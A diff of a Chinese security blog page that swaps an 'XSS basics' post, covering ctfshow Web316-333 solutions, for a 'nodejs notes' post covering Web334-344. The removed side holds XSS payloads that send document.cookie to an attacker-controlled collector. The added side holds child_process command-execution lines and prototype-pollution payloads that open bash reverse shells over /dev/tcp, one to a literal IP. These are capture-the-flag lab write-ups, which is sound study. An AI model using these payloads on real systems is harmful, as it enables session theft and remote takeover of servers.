@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">xss基础 | Troy3e</title>
+  <title itemprop="name">nodejs随笔 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1180716.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1180716.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      xss基础</h1>
+      nodejs随笔</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-10-8<span class="bull">
+        2021-10-11<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,117 +215,97 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>#XSS</p>
-<h2 id="什么是xss？"><a href="#什么是xss？" class="headerlink" title="什么是xss？"></a>什么是xss？</h2><p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
-<h2 id="xss危害"><a href="#xss危害" class="headerlink" title="xss危害"></a>xss危害</h2><p>1、通过 document.cookie 盗取 cookie中的信息<br>2、使用 js或 css破坏页面正常的结构与样式<br>3、流量劫持（通过访问某段具有 window.location.href 定位到其他页面）<br>4、dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。<br>5、利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。<br>6、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。</p>
-<h2 id="xss三种分类"><a href="#xss三种分类" class="headerlink" title="xss三种分类"></a>xss三种分类</h2><p>搬运自<a href="https://ctf-wiki.org/web/xss/" target="_blank" rel="noopener">https://ctf-wiki.org/web/xss/</a></p>
-<p>一、反射型 XSS<br>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
-<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p>服务器端代码：</p>
-<pre><code>&lt;?php 
-// Is there any input? 
-if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { 
-    // Feedback for end user 
-    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; 
-} 
-?&gt;
-</code></pre><p>可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
-<p>二、持久性 XSS<br>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
-<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p>服务器端代码：</p>
-<pre><code>&lt;?php
-  if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
-    // Sanitize message input
-    $message = stripslashes( $message );
-    $message = mysql_real_escape_string( $message );
-    // Sanitize name input
-    $name = mysql_real_escape_string( $name );
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );
-    //mysql_close(); }
-?&gt;
-</code></pre><p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
-<p>三、DOM XSS<br>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
-<p>HTML 代码：</p>
-<pre><code>&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;DOM-XSS test&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;script&gt;
-      var a=document.URL;
-      document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));
-    &lt;/script&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>将代码保存在 domXSS.html 中，浏览器访问：</p>
-<pre><code>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
-</code></pre><p>即可触发 XSS 漏洞。</p>
-<p>##Web316<br>试了试xss平台，第一题可以打通，第二题就不行了，没有管理员的流量，只有我自己的。所以在vps上自己写一个：</p>
-<pre><code>&lt;?php
-$content = $_GET[1];
-if(isset($content)){
-file_put_contents(&quot;flag.txt&quot;,$content);
-}else{
-echo&quot;what happened?;
-}
-?&gt;
-</code></pre><p>注意要给权限。<br>paylaod</p>
-<pre><code>1、
-&lt;script&gt;document.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt;
-2、
-&lt;script&gt;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&lt;/script&gt;
-3、
-&lt;script&gt;location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt;
-4、
-&lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt;
-5、
-&lt;input onfocus=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot; autofocus&gt;
-6、
-&lt;svg onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt;
-7、&lt;iframe onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;
-8、&lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-</code></pre><p>##Web317<br>过滤了script</p>
-<pre><code>&lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-</code></pre><p>##Web318<br>同317</p>
-<p>##Web319<br>同317</p>
-<p>##Web320<br>过滤空格</p>
-<pre><code>1、用tab代替
-&lt;body    onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-2、注释绕过
-&lt;body/**/onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-</code></pre><p>##Web321</p>
-<pre><code>&lt;body    onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-</code></pre><p>##Web322<br>理论上上面是可以打通的，但是打了好几遍没打通。原因是我url里面有xss，这里过滤了xss，所以把xss换掉即可。</p>
-<pre><code>&lt;body    onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;
-</code></pre><p>##Web323<br>同322</p>
-<p>##Web324<br>同322</p>
-<p>##Web325<br>同322</p>
-<p>##Web326<br>同322</p>
-<p>##Web327<br>同322</p>
-<p>##Web328</p>
-<pre><code>&lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&lt;/script&gt;
-</code></pre><p>获得管理员cookie替换即可在用户管理界面看到flag</p>
-<p>##Webb29<br>用上面的payload也能拿到cookie，但是拿到之后就失效了。但是可以写脚本读取页面内容，正好前段时间javaweb接触了点前端的东西：</p>
-<p>flag在密码列第一行，查看元素：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008000223.png" alt></p>
-<p>属于类laytable-cell-1-0-1</p>
-<pre><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,flag){if(flag.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#39;)&gt;-1){window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+flag.innerHTML;}});&lt;/script&gt;
-</code></pre><p>ctfshow拆开是防止读到自己。拿到admin密码登录。</p>
-<p>##Web330</p>
-<pre><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=111&#39;;&lt;/script&gt;
-</code></pre><p>改管理员密码<br>也可以读取页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008111805.png" alt></p>
-<p>##Web331</p>
-<pre><code>&lt;script&gt;$.post(&quot;http://127.0.0.1/api/change.php&quot;,{p:111},&quot;json&quot;);&lt;/script&gt;
-</code></pre><p>##Web332<br>逻辑漏洞 转-9999</p>
-<p>##Web333</p>
-<pre><code>&lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,{&#39;u&#39;:&#39;111111&#39; ,&#39;a&#39;:10000},&quot;json&quot;);&lt;/script&gt;
-</code></pre>
+          <p>Node.js常见漏洞学习与总结<br><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a></p>
+<p>关于继承和原型链：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
+<p>原型链污染：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p>
+<p>##Web334<br>ctfshow 123456</p>
+<p>##Web335<br>无过滤的rce：</p>
+<pre><code>require(&#39;child_process&#39;).execSync(&#39;cat fl00g&#39;);
+require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString()
+require(&#39;child_process&#39;).execFileSync(&#39;ls&#39;)
+</code></pre><p>##Web336</p>
+<pre><code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;./fl001g.txt&#39;]).stdout.toString()
+</code></pre><p>##Web337<br>数组</p>
+<p>##Web338<br>关于继承和原型链：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
+<p>原型链污染：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008225951.png" alt></p>
+<p>关键点在utils.copy(user,req.body);</p>
+<p>##Web339<br>Node.js常见漏洞学习与总结<br><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009105639.png" alt></p>
+<p>36dboy改为了flag，并且多了两个类.<br>要让secert.ctfshow===flag，很显然只能更改secert.ctfshow的值。<br>原型链污染的漏洞还存在，是user类。它的上一级是Object。同时secert的上一级也是object，那么我们只要另user.<strong>proto</strong>.ctfshow=this.flag<br>但是无法实现.</p>
+<p>多出来的api.js有这么一行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009164044.png" alt></p>
+<p>测试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009164600.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009165018.png" alt></p>
+<p>污染点login.js 里的 utils.copy(user,req.body); ，代码执行的触发点在 api.js 的 res.render(‘api’, { query: Function(query)(query)}); 处。</p>
+<pre><code>{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\&quot;&#39;)&quot;}}
+</code></pre><p>##Web340</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009210841.png" alt></p>
+<p>user.userinfo.isAdmin要为1，但是没办法直接通过原型链污染控制isAdmin的值，所以用上一题相同的办法，只是这里要跳两层：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009214342.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009212726.png" alt></p>
+<pre><code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\&quot;&#39;)&quot;}}}
+</code></pre><p>##Web341</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009220758.png" alt></p>
+<p>本以为这题能直接控制isAdmin，但是发现不行，看了看copy函数发现原来是自己理解错了，相同的没法控制：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211009220915.png" alt></p>
+<p>其实这题的预期解ejs rce前几题都是可以用的。</p>
+<p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
+<pre><code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}}
+</code></pre><p>##Web342<br>jade rce<br><a href="https://xz.aliyun.com/t/7025" target="_blank" rel="noopener">https://xz.aliyun.com/t/7025</a><br><a href="https://tari.moe/2021/05/04/ctfshow-nodejs/" target="_blank" rel="noopener">https://tari.moe/2021/05/04/ctfshow-nodejs/</a></p>
+<p>调试下，之前没搞过nodejs，一开始连用哪个软件调试都不知道。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010145836.png" alt></p>
+<p>点击run and debug并创建好launch.json，然后直接run就行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010150134.png" alt></p>
+<p>端口默认是3000，我这里改成了3333。<br>第七行下断点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010162443.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010152947.png" alt></p>
+<p>step into</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165519.png" alt></p>
+<p>step into</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165740.png" alt></p>
+<p>step into</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165803.png" alt></p>
+<p>step into</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010165838.png" alt></p>
+<p>进入jade模块 res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010170021.png" alt></p>
+<p>入口是rebderFile方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010201135.png" alt></p>
+<p>返回值可执行，进入handleTemplateCache</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010203021.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010203657.png" alt></p>
+<p>进入compile</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010212515.png" alt></p>
+<p>都是可控的，但是上面还有个parse没看。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220109.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220543.png" alt></p>
+<p>代码太多，直接看return的东西然后逆推。<br>看下js那的compile</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010220259.png" alt></p>
+<p>返回的是 buf，跟进66行的this.visit(this.node)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211010224412.png" alt></p>
+<p>node.line 可以被 push 到 buf 中，条件是 this.debug=true。<br>但是如何控制node.line的值呢？我的理解是因为这个node.line的值是不存在的，所以我们只需要污染object里面的line即可控制node.line的值。</p>
+<p>下个断点试一下，却发现line的值在正常执行时也是有值的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011163825.png" alt></p>
+<p>发生甚么事了？<br><a href="https://xz.aliyun.com/t/7025#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7025#toc-5</a></p>
+<p>好吧，距离rce还漏了很多东西，至少前面一些条件都没看。<br>1、首先debug要为true</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011165311.png" alt></p>
+<p>这个很好解决，因为一开始他是未定义的，直接污染即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011165426.png" alt></p>
+<p>2、让node.line为undefined</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211011172224.png" alt></p>
+<p>不得不说这个测试的方法很妙。</p>
+<p>3、不报错</p>
+<p>这个时间原因懒得去调了。</p>
+<p>payload</p>
+<pre><code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1\&quot;&#39;)&quot;}}}
+</code></pre><p>参考：<a href="https://tari.moe/2021/05/04/ctfshow-nodejs/" target="_blank" rel="noopener">https://tari.moe/2021/05/04/ctfshow-nodejs/</a></p>
+<p>##Web344</p>
+<pre><code>?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true}
+</code></pre><p>##小结</p>
+<p>342、343学到很多。但是现在审计水平还是一般，大概是缺少开发经验的原因。</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -353,36 +333,19 @@ echo&quot;what happened?;
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/10/11/nodejs随笔/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1181512.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                nodejs随笔</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/09/27/ThinkPHP X 源码分析/" rel="next">
+            <a href="/2021/10/08/xss基础/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1180716.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1180716.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                ThinkPHP X 源码分析</h3>
+                xss基础</h3>
                 <hr>
               </div>
             </a>
